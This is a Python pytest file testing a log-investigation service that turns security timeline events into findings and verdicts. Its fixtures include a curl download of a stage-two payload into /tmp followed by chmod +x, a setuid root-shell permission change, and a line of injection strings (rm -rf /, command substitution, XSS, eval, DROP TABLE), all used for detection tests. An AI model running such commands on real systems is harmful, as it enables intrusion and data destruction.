import pytest
from backend.app.schemas.evidence import LogEventCandidate
from backend.app.schemas.investigation import (
    FindingSeverity,
    InvestigationVerdict,
)
from backend.app.schemas.timeline import AttackStage, EventSeverity, TimelineEvent
from backend.app.services.investigation.exceptions import (
    EmptyInvestigationError,
    OversizedInvestigationError,
)
from backend.app.services.investigation.service import (
    CONFIDENCE_THRESHOLD,
    InvestigationService,
)
from backend.app.services.evidence.service import EvidenceService
from backend.app.services.timeline.service import TimelineService


def _create_event(
    event_id: str,
    index: int,
    raw_message: str,
    time: str = "Oct 06 08:30:00",
    host: str = "srv01",
    process: str = "sshd",
    stage: AttackStage = AttackStage.OTHER,
    severity: EventSeverity = EventSeverity.INFO,
    suspicious: bool = False,
    reason: str = None,
) -> TimelineEvent:
    return TimelineEvent(
        event_id=event_id,
        timestamp=time,
        host=host,
        process=process,
        event_type="TEST",
        message=raw_message,
        raw_message=raw_message,
        original_event_index=index,
        source_line_start=index,
        source_line_end=index,
        suspicious=suspicious,
        severity=severity,
        attack_stage=stage,
        highlight_reason=reason,
        classification_method="rule_based",
    )


def test_empty_events_raises_error():
    with pytest.raises(EmptyInvestigationError) as exc_info:
        InvestigationService.run_investigation([])
    assert exc_info.value.status_code == 400
    assert "empty timeline events" in exc_info.value.message.lower()


def test_oversized_events_raises_error():
    events = [
        _create_event(f"evt-{i:04d}", i, f"Oct 06 08:12:00 srv01 daemon: msg {i}")
        for i in range(1, 2005)
    ]
    with pytest.raises(OversizedInvestigationError) as exc_info:
        InvestigationService.run_investigation(events)
    assert exc_info.value.status_code == 400
    assert "exceeds maximum allowed limit" in exc_info.value.message.lower()


def test_insufficient_evidence_verdict():
    # Only 1 benign event
    events = [
        _create_event(
            "evt-001",
            1,
            "Oct 06 08:12:01 srv01 systemd[1]: Starting Daily apt download activities...",
            process="systemd",
        )
    ]
    resp = InvestigationService.run_investigation(events)
    assert resp.verdict == InvestigationVerdict.INSUFFICIENT_EVIDENCE
    assert resp.total_events_analyzed == 1
    assert resp.findings_count == 0
    assert resp.low_confidence_excluded_count == 0
    assert "insufficient evidence" in resp.verdict_explanation.lower()
    assert len(resp.activities) == 5


def test_no_high_confidence_benign_system():
    # Multiple benign events
    events = [
        _create_event("evt-001", 1, "Oct 06 08:12:01 srv01 systemd[1]: Starting Daily apt download activities..."),
        _create_event("evt-002", 2, "Oct 06 08:12:05 srv01 systemd[1]: apt-daily.service: Deactivated successfully."),
        _create_event("evt-003", 3, "Oct 06 08:15:22 srv01 sshd[1420]: Server listening on 0.0.0.0 port 22."),
        _create_event("evt-004", 4, "Oct 06 08:20:00 srv01 systemd[1]: Routine status check ok."),
    ]
    resp = InvestigationService.run_investigation(events)
    assert resp.verdict == InvestigationVerdict.NO_HIGH_CONFIDENCE_FINDINGS
    assert resp.findings_count == 0
    assert resp.low_confidence_excluded_count == 0
    assert "routine operational activity" in resp.verdict_explanation.lower()


def test_isolated_weak_indicator_exclusion():
    # A single isolated failed login attempt (weak indicator)
    events = [
        _create_event(
            "evt-001",
            1,
            "Oct 06 08:35:10 srv01 sshd[2104]: Failed password for invalid user admin from 192.168.1.105 port 43210 ssh2",
            stage=AttackStage.AUTHENTICATION,
            severity=EventSeverity.LOW,
            suspicious=True,
            reason="SSH authentication failure",
        ),
        _create_event("evt-002", 2, "Oct 06 08:36:00 srv01 systemd[1]: Routine tick."),
        _create_event("evt-003", 3, "Oct 06 08:37:00 srv01 systemd[1]: Routine tick."),
    ]
    resp = InvestigationService.run_investigation(events)
    # The weak indicator is retained internally but excluded from visible findings
    assert resp.verdict == InvestigationVerdict.NO_HIGH_CONFIDENCE_FINDINGS
    assert resp.findings_count == 0
    assert resp.low_confidence_excluded_count == 1
    assert len(resp.findings) == 0
    assert "low-confidence indicator" in resp.verdict_explanation.lower()


def test_related_event_correlation_payload_staging():
    # Correlated sequence: curl download to /tmp followed by chmod +x
    events = [
        _create_event(
            "evt-001",
            1,
            "Oct 06 08:44:31 srv01 auditd[650]: PROCESS_EXEC: pid=2240 comm=\"curl\" cmdline=\"curl -s -o /tmp/.cache_updater http://192.168.1.105:8000/stage2.sh\" user=sec_analyst",
            time="Oct 06 08:44:31",
            process="auditd",
            stage=AttackStage.EXECUTION,
            severity=EventSeverity.HIGH,
            suspicious=True,
        ),
        _create_event(
            "evt-002",
            2,
            "Oct 06 08:45:12 srv01 auditd[650]: PROCESS_EXEC: pid=2255 comm=\"chmod\" cmdline=\"chmod +x /tmp/.cache_updater\" user=sec_analyst",
            time="Oct 06 08:45:12",
            process="auditd",
            stage=AttackStage.EXECUTION,
            severity=EventSeverity.MEDIUM,
            suspicious=True,
        ),
    ]
    resp = InvestigationService.run_investigation(events)
    assert resp.verdict == InvestigationVerdict.SUSPICIOUS_ACTIVITY_DETECTED
    assert resp.findings_count >= 1

    staging_finding = next((f for f in resp.findings if f.category == "SUSPICIOUS_EXECUTION"), None)
    assert staging_finding is not None
    assert staging_finding.severity == FindingSeverity.HIGH
    assert staging_finding.confidence_score >= CONFIDENCE_THRESHOLD
    assert "evt-001" in staging_finding.supporting_events
    assert "evt-002" in staging_finding.supporting_events
    assert 1 in staging_finding.original_event_indexes
    assert 2 in staging_finding.original_event_indexes
    assert "payload" in staging_finding.explanation.lower()


def test_evidence_reference_grounding_no_fabrication():
    # Ensure all finding attributes are directly derived from input events
    events = [
        _create_event(
            "evt-101",
            10,
            "Oct 06 08:48:05 custom-host auditd[650]: FILE_PERM_CHANGE: path=\"/tmp/.rootshell\" mode=4755 suid=true comm=\"chmod\"",
            time="Oct 06 08:48:05",
            host="custom-host",
            process="auditd",
            stage=AttackStage.PRIVILEGE_ESCALATION,
            severity=EventSeverity.CRITICAL,
            suspicious=True,
        )
    ]
    resp = InvestigationService.run_investigation(events)
    assert resp.findings_count == 1
    finding = resp.findings[0]
    assert finding.supporting_events == ["evt-101"]
    assert finding.original_event_indexes == [10]
    assert finding.hosts == ["custom-host"]
    assert finding.timestamps == ["Oct 06 08:48:05"]
    assert finding.processes == ["auditd"]
    assert finding.confidence_score == 0.95
    assert finding.severity == FindingSeverity.CRITICAL


def test_safe_treatment_of_malicious_log_text():
    # Log contains destructive command strings and injection attempts
    malicious_text = (
        "Oct 06 08:55:00 srv01 bash[99]: `rm -rf /` $(whoami); <script>alert('xss')</script> "
        "eval('__import__(\"os\").system(\"echo pwned\")') ; DROP TABLE logs; --"
    )
    events = [
        _create_event(
            "evt-999",
            1,
            malicious_text,
            time="Oct 06 08:55:00",
            host="srv01",
            process="bash",
        )
    ]
    resp = InvestigationService.run_investigation(events)
    # The pipeline executes completely safely as inert text
    assert resp.total_events_analyzed == 1
    assert resp.verdict in (
        InvestigationVerdict.INSUFFICIENT_EVIDENCE,
        InvestigationVerdict.NO_HIGH_CONFIDENCE_FINDINGS,
    )


def test_realistic_privilege_escalation_sample_scenario():
    # End-to-end verification using the real 30-event sample scenario
    ev_resp = EvidenceService.process_sample_scenario("sample-privilege-escalation.log")
    tl_resp = TimelineService.build_timeline(ev_resp.normalized_events)

    resp = InvestigationService.run_investigation(tl_resp.timeline)

    assert resp.total_events_analyzed == 30
    assert resp.verdict == InvestigationVerdict.SUSPICIOUS_ACTIVITY_DETECTED
    assert resp.findings_count >= 5

    categories = {f.category for f in resp.findings}
    assert "AUTHENTICATION_ANOMALY" in categories
    assert "PRIVILEGE_ESCALATION" in categories
    assert "SUSPICIOUS_EXECUTION" in categories
    assert "PERSISTENCE" in categories
    assert "POST_EXPLOITATION" in categories

    # Verify critical escalation finding exists
    privesc_fnd = next((f for f in resp.findings if f.category == "PRIVILEGE_ESCALATION"), None)
    assert privesc_fnd is not None
    assert privesc_fnd.severity == FindingSeverity.CRITICAL
    assert privesc_fnd.confidence_score >= 0.90
    assert privesc_fnd.recommended_next_step is not None

    # Verify post-exploitation shadow access finding
    shadow_fnd = next((f for f in resp.findings if f.category == "POST_EXPLOITATION"), None)
    assert shadow_fnd is not None
    assert shadow_fnd.severity == FindingSeverity.CRITICAL
    assert shadow_fnd.confidence_score >= 0.90
    assert "/etc/shadow" in shadow_fnd.explanation

    # Verify structured activities
    steps = [act.step for act in resp.activities]
    assert steps == [
        "VALIDATION",
        "CORRELATION",
        "SEQUENCE_ANALYSIS",
        "CONFIDENCE_ASSESSMENT",
        "RESULT_PREPARATION",
    ]
